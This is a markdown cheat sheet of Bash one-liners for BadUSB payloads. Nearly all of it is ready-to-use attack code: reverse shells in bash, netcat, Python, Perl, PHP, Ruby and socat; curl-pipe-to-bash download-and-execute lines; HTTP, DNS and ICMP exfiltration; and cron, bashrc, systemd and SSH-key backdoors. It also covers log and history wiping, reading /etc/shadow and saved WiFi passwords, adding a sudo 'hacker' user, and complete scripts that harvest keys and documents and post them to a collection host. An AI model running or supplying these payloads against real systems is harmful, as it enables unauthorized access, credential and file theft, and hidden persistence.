# Bash One-Liners for BadUSB Payloads

## System Information

```bash
# Hostname
hostname

# Username
whoami

# User ID
id

# Full system info
uname -a

# Distribution info
cat /etc/os-release

# CPU info
lscpu

# Memory info
free -h

# Disk info
df -h

# Running processes
ps aux

# Network interfaces
ip a

# Logged in users
who

# System uptime
uptime
```

## Network

```bash
# IP addresses
ip addr show

# Active connections
ss -tuln

# Established connections
ss -tupn | grep ESTABLISHED

# Routing table
ip route

# DNS servers
cat /etc/resolv.conf

# ARP cache
ip neigh

# Public IP
curl -s ifconfig.me

# Network interfaces
ip link show

# Open ports
netstat -tlnp 2>/dev/null || ss -tlnp

# WiFi networks (if available)
nmcli device wifi list 2>/dev/null

# WiFi saved passwords
sudo grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null
```

## File Operations

```bash
# Search for files
find / -name "*.txt" 2>/dev/null

# Search in file contents
grep -r "password" /home 2>/dev/null

# Recent files
find /home -type f -mtime -7 2>/dev/null

# SUID files
find / -perm -4000 2>/dev/null

# World-writable files
find / -perm -o+w -type f 2>/dev/null

# Hidden files
find /home -name ".*" -type f 2>/dev/null

# Read file
cat file.txt

# Copy file
cp source dest

# Compress directory
tar -czvf archive.tar.gz /path/to/dir

# Extract archive
tar -xzvf archive.tar.gz

# Base64 encode file
base64 file.txt

# Base64 decode
echo "BASE64" | base64 -d
```

## Download & Execute

```bash
# Curl download
curl -o /tmp/file http://IP/file

# Wget download
wget -O /tmp/file http://IP/file

# Download and execute
curl -s http://IP/script.sh | bash

# Download and execute (wget)
wget -qO- http://IP/script.sh | bash

# Background execution
nohup ./script.sh &>/dev/null &

# Fetch and save
curl http://IP/file -o /tmp/file && chmod +x /tmp/file && /tmp/file
```

## Reverse Shells

```bash
# Bash TCP
bash -i >& /dev/tcp/IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/IP/PORT 0>&1

# Netcat (with -e)
nc -e /bin/bash IP PORT

# Netcat (without -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP PORT > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Perl
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

# Socat
socat TCP:IP:PORT EXEC:/bin/bash
```

## Exfiltration

```bash
# HTTP POST (curl)
curl -X POST -d "data=$(cat file.txt)" http://IP/collect

# HTTP POST file
curl -X POST -F "file=@/path/to/file" http://IP/upload

# Base64 over HTTP
curl -X POST -d "data=$(base64 file.txt)" http://IP/collect

# DNS exfiltration
data=$(echo "secret" | base64); host "$data.exfil.domain.com"

# Netcat file transfer
nc IP PORT < file.txt

# SCP (if SSH available)
scp file.txt user@IP:/path/

# ICMP exfil (requires root)
xxd -p file.txt | while read line; do ping -c 1 -p "$line" IP; done
```

## Persistence

```bash
# Crontab
(crontab -l 2>/dev/null; echo "* * * * * /tmp/backdoor") | crontab -

# Bashrc
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1 &' >> ~/.bashrc

# Profile
echo '/tmp/backdoor &' >> ~/.profile

# SSH authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Systemd service (requires root)
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Service
[Service]
ExecStart=/tmp/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor

# Init.d (requires root)
cp /tmp/backdoor /etc/init.d/
update-rc.d backdoor defaults

# At job
echo "/tmp/backdoor" | at now + 1 minute
```

## Privilege Escalation Checks

```bash
# Sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd

# Kernel version
uname -r

# Running services
systemctl list-units --type=service --state=running

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Environment variables
env

# Interesting files
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
```

## Defense Evasion

```bash
# Clear history
history -c
export HISTSIZE=0
unset HISTFILE

# Remove log entries
sed -i '/pattern/d' /var/log/auth.log

# Timestomp file
touch -r /etc/passwd /tmp/backdoor

# Hide process name
exec -a "[kworker/0:0]" /tmp/backdoor

# Run in memory (no disk)
curl -s http://IP/script.sh | bash

# Background and disown
nohup /tmp/backdoor &>/dev/null & disown
```

## User Management

```bash
# List users
cat /etc/passwd

# List groups
cat /etc/group

# Add user (requires root)
useradd -m -s /bin/bash hacker

# Set password
echo "hacker:password" | chpasswd

# Add to sudo group
usermod -aG sudo hacker

# Create .ssh for user
mkdir -p /home/hacker/.ssh
echo "ssh-rsa AAAA..." > /home/hacker/.ssh/authorized_keys
chown -R hacker:hacker /home/hacker/.ssh
chmod 700 /home/hacker/.ssh
chmod 600 /home/hacker/.ssh/authorized_keys
```

## Common Payload Patterns

### Quick Recon Script
```bash
#!/bin/bash
OUTPUT="/tmp/.recon_$(date +%s)"
{
    echo "=== SYSTEM INFO ==="
    uname -a
    cat /etc/os-release
    echo "=== USER INFO ==="
    whoami
    id
    echo "=== NETWORK ==="
    ip a
    ss -tuln
    echo "=== INTERESTING FILES ==="
    find /home -name "*.txt" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -20
} > "$OUTPUT"
curl -X POST -d "@$OUTPUT" http://IP/collect
rm -f "$OUTPUT"
```

### Silent Persistence
```bash
#!/bin/bash
# Add to cron
(crontab -l 2>/dev/null | grep -v "backdoor"; echo "*/5 * * * * /tmp/.backdoor >/dev/null 2>&1") | crontab -
# Create backdoor
cat > /tmp/.backdoor << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/IP/PORT 0>&1
EOF
chmod +x /tmp/.backdoor
```

### File Harvester
```bash
#!/bin/bash
EXFIL="http://IP/upload"
PATTERNS="*.txt *.doc* *.pdf *.key *.pem id_rsa"
for pattern in $PATTERNS; do
    find /home -name "$pattern" 2>/dev/null | while read f; do
        curl -s -X POST -F "file=@$f" -F "path=$f" "$EXFIL"
    done
done
```

## Terminal Commands Quick Reference

| Command | Description |
|---------|-------------|
| `Ctrl+C` | Kill foreground process |
| `Ctrl+Z` | Suspend process |
| `bg` | Resume in background |
| `fg` | Resume in foreground |
| `jobs` | List background jobs |
| `disown` | Detach from terminal |
| `nohup` | Ignore hangup signal |
| `screen` | Terminal multiplexer |
| `tmux` | Terminal multiplexer |

## Useful One-Liners

```bash
# Get all IP addresses
hostname -I

# Check if root
[ "$(id -u)" -eq 0 ] && echo "root" || echo "not root"

# Silent command (no output)
command &>/dev/null

# Run command after delay
sleep 5 && command

# Loop forever
while true; do command; sleep 60; done

# Parallel execution
command1 & command2 & wait

# Check if command exists
command -v nc &>/dev/null && echo "nc exists"

# Get script directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Self-delete script
rm -- "$0"
```

---

[← Back to Main](../README.md)
